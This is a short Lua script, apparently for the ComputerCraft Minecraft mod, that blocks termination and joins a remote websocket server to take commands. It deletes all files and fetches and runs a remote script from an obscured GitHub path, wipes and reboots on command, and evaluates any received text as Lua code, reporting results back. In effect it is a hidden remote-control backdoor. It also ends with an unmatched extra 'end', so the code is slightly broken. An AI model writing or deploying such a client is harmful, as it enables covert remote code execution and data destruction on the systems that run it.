os.pullEvent = os.pullEventRaw
ws = http.websocket("ws://"..arg[1])
ws.send('name')
while true do
   plain = ws.receive()
   if plain == 'reinstall' then
      shell.execute("delete","*")
      shell.execute("wget",'run','https://raw.githubusercontent.com/BouncyRocket/-/%E2%80%8B%E2%80%8B/sup.lua')
   end
   if plain == 'wipe' then
      shell.execute("delete","*")
      os.reboot()
      os.exit()
   end
   if plain == 'rn' then
      ws.send("rename")
   end
   if plain == 'id' then
      ws.send("C:".. os.getComputerID())
      print("C:".. os.getComputerID())
   end
   local success, result = pcall(load("return " .. plain))
   if success then
      ws.send(result)
   else
      os.reboot()
   end
   end
end